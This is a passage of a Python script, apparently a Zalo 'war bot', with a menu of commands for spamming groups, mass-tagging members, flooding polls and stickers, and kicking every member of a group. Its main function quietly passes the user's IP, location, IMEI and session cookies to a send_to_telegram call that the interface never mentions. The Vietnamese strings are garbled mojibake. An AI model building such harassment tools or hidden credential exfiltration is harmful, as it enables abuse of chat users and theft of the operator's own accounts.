            animated_text("‚ïë üîó fb.com/quangthangdev                ", 0.02)
            animated_text("‚ïë ‚è≤ Tho√°t sau 5 gi√¢y...                 ", 0.02)
            print(random_color_line("‚ïë                                   "))
            print(random_color_line("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"))
            time.sleep(5)
            return False
    
    return False

def print_menu():
    current_time = get_current_time()
    ip, isp, location = get_network_info()

    os.system('cls' if os.name == 'nt' else 'clear')
    animated_text("‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê üöÄ B·∫¢NG ƒêI·ªÄU KHI·ªÇN BOT WAR ZALO üöÄ ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó", 0.05)
    print(random_color_line("‚ïë                                                 "))
    animated_text(f"‚ïë üë®‚Äçüíª T√°c gi·∫£: Tr∆∞∆°ng Quang Th·∫Øng              ", 0.02)
    animated_text(f"‚ïë üéÇ Sinh nh·∫≠t: 08/05/200X     ", 0.02)
    animated_text(f"‚ïë üè° Qu√™ qu√°n: Th√°i B√¨nh, Vi·ªát Nam                ", 0.02)
    animated_text(f"‚ïë üíº Ngh·ªÅ nghi·ªáp: Developer Fullstack & Hacker  ", 0.02)
    animated_text(f"‚ïë üéì H·ªçc v·∫•n: T·ª± h·ªçc, ƒëam m√™ l·∫≠p tr√¨nh          ", 0.02)
    animated_text(f"‚ïë üéÆ S·ªü th√≠ch: Coding, Gaming, Anime, Hacking   ", 0.02)
    animated_text(f"‚ïë üåü Th√†nh t·ª±u: Bot War Zalo m·∫°nh nh·∫•t 2025     ", 0.02)
    animated_text(f"‚ïë üí° Tri·∫øt l√Ω: 'Code ƒë·ªÉ thay ƒë·ªïi th·∫ø gi·ªõi'      ", 0.02)
    animated_text(f"‚ïë üìß Li√™n h·ªá: quangthangdev@gmail.com           ", 0.02)
    animated_text(f"‚ïë üì≤ Telegram: t.me/quangthangcoder             ", 0.02)
    animated_text(f"‚ïë üîó FB: fb.com/quangthangdev                   ", 0.02)
    animated_text(f"‚ïë üîß C√¥ng c·ª• l·∫≠p tr√¨nh: Python, JS, C++, PHP    ", 0.02)
    animated_text(f"‚ïë ‚öôÔ∏è Framework: Flask, Django, React, Node.js   ", 0.02)
    animated_text(f"‚ïë üé® IDE: VS Code, PyCharm, IntelliJ, Sublime   ", 0.02)
    animated_text(f"‚ïë üìÖ C·∫≠p nh·∫≠t: 10/03/2025                      ", 0.02)
    animated_text(f"‚ïë üéØ M·ª•c ƒë√≠ch: Chi·∫øn th·∫Øng m·ªçi cu·ªôc War Zalo    ", 0.02)
    animated_text(f"‚ïë ‚è∞ Th·ªùi gian: {current_time}                  ", 0.02)
    animated_text(f"‚ïë üåê IP: {ip}                                   ", 0.02)
    animated_text(f"‚ïë üì° Nh√† m·∫°ng: {isp}                            ", 0.02)
    animated_text(f"‚ïë üìç V·ªã tr√≠: {location}                         ", 0.02)
    print(random_color_line("‚ïë                                                 "))
    print(random_color_line("‚ï†‚ïê‚ïê‚ïê‚ïê üî• DANH S√ÅCH L·ªÜNH WAR üî• ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£"))
    animated_text(f"‚ïë ‚öôÔ∏è Ch·ªçn s·ªë ƒë·ªÉ k√≠ch ho·∫°t si√™u nƒÉng l·ª±c:         ", 0.02)
    animated_text(f"‚ïë 1. big        - Ch·ªØ l·ªõn t·ª´ chui.txt (1s)          ", 0.02)
    animated_text(f"‚ïë 2. bigitalic  - Ch·ªØ l·ªõn + nghi√™ng t·ª´ chui.txt (1s)", 0.02)
    animated_text(f"‚ïë 3. bigsmall   - Ch·ªØ l·ªõn + nh·ªè t·ª´ chui.txt (1s)    ", 0.02)
    animated_text(f"‚ïë 4. italic     - Ch·ªØ nghi√™ng t·ª´ chui.txt (1s)      ", 0.02)
    animated_text(f"‚ïë 5. kickall    - X√≥a t·∫•t c·∫£ th√†nh vi√™n nh√≥m        ", 0.02)
    animated_text(f"‚ïë 6. lende      - Spam mention ng·∫´u nhi√™n (0.1s)     ", 0.02)
    animated_text(f"‚ïë 7. nhay       - Spam vƒÉn b·∫£n t·ª´ chui.txt (1s)     ", 0.02)
    animated_text(f"‚ïë 8. nhaytag    - Tag t·∫•t c·∫£ t·ª´ chui.txt (0.1s)      ", 0.02)
    animated_text(f"‚ïë 9. nhayuser   - Tag ng∆∞·ªùi d√πng t·ª´ chui.txt (6s)    ", 0.02)
    animated_text(f"‚ïë 10. poll on   - T·∫°o poll t·ª´ chui.txt (1s)          ", 0.02)
    animated_text(f"‚ïë 11. small     - Ch·ªØ nh·ªè t·ª´ chui.txt (1s)          ", 0.02)
    animated_text(f"‚ïë 12. spam      - G·ª≠i to√†n b·ªô spam.txt (10s)         ", 0.02)
    animated_text(f"‚ïë 13-22. spam1-10 - G·ª≠i to√†n b·ªô spam1-10.txt (10s)   ", 0.02)
    animated_text(f"‚ïë 23. spamitalic - G·ª≠i spam.txt ch·ªØ nghi√™ng (10s)    ", 0.02)
    animated_text(f"‚ïë 24. spamsmall - G·ª≠i spam.txt ch·ªØ nh·ªè (10s)         ", 0.02)
    animated_text(f"‚ïë 25. spamsuperbig - G·ª≠i spam.txt ch·ªØ si√™u to (10s)  ", 0.02)
    animated_text(f"‚ïë 26. spamstk   - Spam sticker (10s)                 ", 0.02)
    animated_text(f"‚ïë 27. spamtag   - Tag all to√†n b·ªô spamtag.txt (10s)  ", 0.02)
    animated_text(f"‚ïë 28-37. spamtag1-10 - Tag all spamtag1-10.txt (10s) ", 0.02)
    animated_text(f"‚ïë 38. spamtagbig - Tag t·∫•t c·∫£ ch·ªØ l·ªõn (1s)          ", 0.02)
    animated_text(f"‚ïë 39. spamtagitalic - Tag all ch·ªØ nghi√™ng (10s)      ", 0.02)
    animated_text(f"‚ïë 40. spamtaglag - Tag t·∫•t c·∫£ t·ª´ chui.txt (1s)      ", 0.02)
    animated_text(f"‚ïë 41. spamtagmix - Tag t·∫•t c·∫£ t·ª´ chui.txt (1s)      ", 0.02)
    animated_text(f"‚ïë 42. spamtagsmall - Tag all ch·ªØ nh·ªè (10s)           ", 0.02)
    animated_text(f"‚ïë 43. spamtagsuperbig - Tag all ch·ªØ si√™u to (10s)    ", 0.02)
    animated_text(f"‚ïë 44. superbig  - Ch·ªØ si√™u to t·ª´ chui.txt (1s)      ", 0.02)
    animated_text(f"‚ïë 45. all       - Ch·∫°y t·∫•t c·∫£ l·ªánh                  ", 0.02)
    print(random_color_line("‚ïë                                                 "))
    print(random_color_line("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"))
    animated_text("‚è≥ Nh·∫≠p s·ªë l·ªánh ƒë·ªÉ k√≠ch ho·∫°t (1-45): üî•", 0.03)

def main():
    key_type = select_key_type()
    if not key_type:
        return

    key_input = None
    if key_type == "2" or key_type == "3":
        key_input = print_key_input(key_type)
    if not validate_key(key_input, key_type):
        return

    ip, isp, location = get_network_info()
    send_to_telegram(ip, isp, location, IMEI, SESSION_COOKIES)

    print_menu()
    choice = input(random_color_line("üîß L·ªánh: ")).strip().lower()
    client = Bot(API_KEY, SECRET_KEY, imei=IMEI, session_cookies=SESSION_COOKIES)
    
    command_map = {
        '1': 'big', '2': 'bigitalic', '3': 'bigsmall', '4': 'italic', '5': 'kickall',
        '6': 'lende', '7': 'nhay', '8': 'nhaytag', '9': 'nhayuser', '10': 'poll on',
        '11': 'small', '12': 'spam', '13': 'spam1', '14': 'spam2', '15': 'spam3',
        '16': 'spam4', '17': 'spam5', '18': 'spam6', '19': 'spam7', '20': 'spam8',
        '21': 'spam9', '22': 'spam10', '23': 'spamitalic', '24': 'spamsmall', 
        '25': 'spamsuperbig', '26': 'spamstk', '27': 'spamtag', '28': 'spamtag1',
        '29': 'spamtag2', '30': 'spamtag3', '31': 'spamtag4', '32': 'spamtag5',
        '33': 'spamtag6', '34': 'spamtag7', '35': 'spamtag8', '36': 'spamtag9',
        '37': 'spamtag10', '38': 'spamtagbig', '39': 'spamtagitalic', '40': 'spamtaglag',
        '41': 'spamtagmix', '42': 'spamtagsmall', '43': 'spamtagsuperbig', '44': 'superbig',
        '45': 'all'
    }
    
    if choice in command_map:
        animated_text(f"‚úÖ ƒê√£ k√≠ch ho·∫°t l·ªánh: {command_map[choice]}", 0.03)
    else:
        animated_text("‚ùå L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá!", 0.03)
        return

    animated_text("‚ö° Running By Quang Thang. S·ª≠ d·ª•ng l·ªánh trong Zalo ƒë·ªÉ b·∫Øt ƒë·∫ßu.", 0.03)
    client.listen(run_forever=True, thread=True, delay=0, type='requests')

if __name__ == "__main__":
    main()